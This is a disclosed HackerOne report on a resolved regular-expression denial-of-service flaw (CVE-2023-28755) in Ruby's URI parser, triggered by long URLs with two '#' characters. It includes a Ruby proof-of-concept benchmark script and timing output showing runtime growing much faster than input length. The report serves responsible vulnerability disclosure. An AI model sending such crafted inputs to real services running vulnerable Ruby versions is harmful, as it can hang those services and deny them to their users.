# [M] URI parser's RFC3986 regular expression has poor performance when there are two # characters, leading to ReDoS

## Summary
Severity: Medium (CVSS 5.3)
Program: Ruby
Weakness: N/A
Reporter: dee-see
State: resolved
Disclosed: 2023-12-13T14:10:44.216Z
CVE: CVE-2023-28755
Source: https://hackerone.com/reports/1444501

## Details
## Summary

Hello team, I hope you're doing well! The `URI` parser mishandles invalid URLs that have two `#` characters. It does correctly identify that they're invalid, but the regex performs very poorly and execution time grows much faster than the string length.

I found this somewhat accidentally when fuzzing for something else. I'm not sure if you care about such issues but I figured I'd report it anyway. The length of the strings required to actually cause the process to hang are very long, but it's not really an issue when the user-controlled input is sent in a request body.

## Steps to reproduce

Run the following script

```ruby
require 'benchmark'
require 'uri'

def parse(n)
  URI('https://example.com/dir/' + 'a' * n + '/##.jpg')
  rescue URI::InvalidURIError
  # Invalid URI because of the two #
end

n = 50000
Benchmark.bm(7) do |x|
  x.report('Base length') { parse(n) }
  x.report('Length x2  ') { parse(n * 2) }
  x.report('Length x4  ') { parse(n * 4) }
  x.report('Length x8  ') { parse(n * 8) }
end
```

Here's the output on my machine

```plaintext
              user     system      total        real
Base length  1.086961   0.003059   1.090020 (  1.090500)
Length x2    4.415046   0.000000   4.415046 (  4.416986)
Length x4   22.021462   0.003294  22.024756 ( 22.042507)
Length x8  122.695223   0.006653 122.701876 (122.853669)
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1444501_
